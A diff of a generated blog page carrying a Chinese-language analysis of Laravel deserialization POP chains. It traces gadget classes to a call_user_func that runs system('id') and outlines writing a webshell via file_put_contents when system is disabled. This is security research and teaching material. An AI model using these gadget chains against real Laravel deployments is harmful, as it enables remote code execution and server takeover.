 [new \GuzzleHttp\HandlerStack(&quot;system&quot;, &quot;id&quot;),&#39;resolve&#39;]</code>即此时<code>$prev</code>参数首先经过<code>$prev = $this-&gt;handler</code>以后为id，接着经过foreach <code>(array_reverse($this-&gt;stack) as $fn)</code>，<code>$fn</code>将为包含一个元素的数组<code>[&quot;system&quot;]</code>,然后经过<code>$fn[0]</code>即为<code>system</code>，即<code>$prev</code>即为<code>system(&quot;id&quot;)</code>;最后函数调用返回再传入<code>call_user_func，即构成call_user_func(system(&quot;id&quot;))</code>;<br>        到此，整个调用链已经分析结束，实现的原理也清楚了。</p>
 ]]></content>
@@ -328,10 +295,8 @@
 
 <h3 id="3-phpstorm配置Lavarel-artisan调试"><a href="#3-phpstorm配置Lavarel-artisan调试" class="headerlink" title="3.phpstorm配置Lavarel artisan调试"></a>3.phpstorm配置Lavarel artisan调试</h3><p>打开 PhpStorm 的配置功能，搜索 Debug 打开标签页，修改 xDebug port 为 9001</p>
 <p><strong>Tips</strong>: 9001 是可以自由修改的，但需要和 php.ini 配置的 xdebug.remote_port 保持一致</p>
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/phpstorm2.png" class>
-
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/phpstorm%20configuration.png" class>
-
+<p><img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/phpstorm2.png" alt="label"></p>
+<p>![label](./Laravel-RCE1-7-POP链分析/phpstorm configuration.png)</p>
 <h3 id="4-Lavarel版本"><a href="#4-Lavarel版本" class="headerlink" title="4.Lavarel版本"></a>4.Lavarel版本</h3><p><code>Laravel5.4.x</code>、<code>Laravel5.5.x</code>的PHP版本要求是<code>&gt;=7.0.0</code>，Laravel5.6.x、Laravel5.7.x、Laravel5.8.x的PHP版本要求是<code>7.1.3&lt;=版本号&lt;8.0.0</code>。</p>
 <h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><p>​        本文分析RCE1的时候，Laravel版本采用的是5.4.30，采用composer安装。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel laravel5.4.30 "5.4.*"</span><br><span class="line">cd laravel5.4.30\</span><br><span class="line">composer install</span><br><span class="line">php artisan cache:clear</span><br><span class="line">php artisan make:auth</span><br><span class="line">php artisan migrate</span><br></pre></td></tr></table></figure>
@@ -354,8 +319,7 @@
 
 <p>​        本地启动：<code>php artisan serve --host=0.0.0.0</code></p>
 <p>​        访问：</p>
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/laravel5.4.30.png" class>
-
+<p><img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/laravel5.4.30.png" alt="label"></p>
 <h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><p><code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast</code></p>
 <h3 id="RCE调用类"><a href="#RCE调用类" class="headerlink" title="RCE调用类"></a>RCE调用类</h3><p><code>vendor/fzaninotto/faker/src/Faker/Generator.php/Generator</code></p>
 <p>从<code>__destruct</code>入手，<code>PendingBroadcast::__destruct()</code>第50-59行：</p>
@@ -388,12 +352,9 @@
 
 <p><strong>注：</strong>比较诡异的一点，这个payload我用在PHP7.3.9+Lavarel8.5.35的测试环境时，也能够执行成功。按理说PHP版本大于7.0.9，CVE-2016-7124无法触发。</p>
 <p>这里有个需要注意的点，我们来看一下<a href="https://www.php.net/manual/zh/function.call-user-func-array.php" target="_blank" rel="noopener">call_user_func_array</a>函数的定义：</p>
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/call_user_func_array1.png" class>
-
+<p><img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/call_user_func_array1.png" alt="label"></p>
 <p>注意函数的第一个参数需要是<code>callable</code>类型的，该类型的解释如下：</p>
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/call_user_func_array2.png" class>
-
-<p>也就是说，在编写exp的时候，不能把<code>eval</code>传递给<code>call_user_func_array</code>函数，当做该函数的第一个参数的值。因为<code>eval</code>被排除在<code>Callback</code>类型之外了，传递进去会产生错误。</p>
+<p><img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/call_user_func_array2.png" alt="label">也就是说，在编写exp的时候，不能把<code>eval</code>传递给<code>call_user_func_array</code>函数，当做该函数的第一个参数的值。因为<code>eval</code>被排除在<code>Callback</code>类型之外了，传递进去会产生错误。</p>
 <h3 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h3><p><strong>本exp所在测试环境为PHP7.3.9+Laravel5.8.35。</strong></p>
 <p>EXP1中，如果靶机禁用了像system这种的危险函数，我们需要使用双参数的函数例如file_put_contents写shell，或者希望执行任意函数，那么上面的payload就没办法了。<code>call_user_func_array</code> 第一个参数是完全可控的，这意味着我们可以调用任意类对象的任意方法，那么我们找一个有危险函数的类，并且参数可控就好了。搜索寻找<code>PhpOption/LazyOption</code> 类中的option函数的call_user_func_array函数中间两个参数都是完全可控的，非常完美的函数。</p>
 <p><code>vendor\phpoption\phpoption\src\PhpOption\LazyOption.php</code>第153-170行：</p>
@@ -418,8 +379,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get all of the listeners for a given event name.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string  $eventName</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getListeners</span><span class="params">($eventName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listeners = <span class="keyword">$this</span>-&gt;listeners[$eventName] ?? [];</span><br><span class="line"></span><br><span class="line">    $listeners = array_merge(</span><br><span class="line">        $listeners, <span class="keyword">$this</span>-&gt;getWildcardListeners($eventName)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> class_exists($eventName, <span class="keyword">false</span>)</span><br><span class="line">                ? <span class="keyword">$this</span>-&gt;addInterfaceListeners($eventName, $listeners)</span><br><span class="line">                : $listeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以发现我们可以控制的参数是<code>$this-&gt;listeners[]</code>数组，并且这里的<code>$eventName</code>就是<code>Illuminate\Broadcasting\PendingBroadcast</code>类的<code>$this-&gt;event</code>为我们执行命令的参数，所以<code>class_exists($eventName, false)</code>为false，直接返回<code>$listeners</code>。然后返回<code>dispatch</code>函数进行foreach操作，这里我们已经可以控制<code>$this-&gt;getListeners($event)</code>的返回值，所以就可以控制<code>$listener</code>。我们来看一下<code>system</code>函数的定义：</p>
-<img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/system.png" class>
-
+<p><img src="/2021/06/08/Laravel-RCE1-7-POP%E9%93%BE%E5%88%86%E6%9E%90/system.png" alt="label"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getListeners($event) <span class="keyword">as</span> $listener) &#123;</span><br><span class="line">           $response = $listener($event, $payload);</span><br></pre></td></tr></table></figure>
 
 <p>我们可以知道，执行system命令，就可以不管<code>$payload</code>变量，并且system函数支持2个参数。</p>
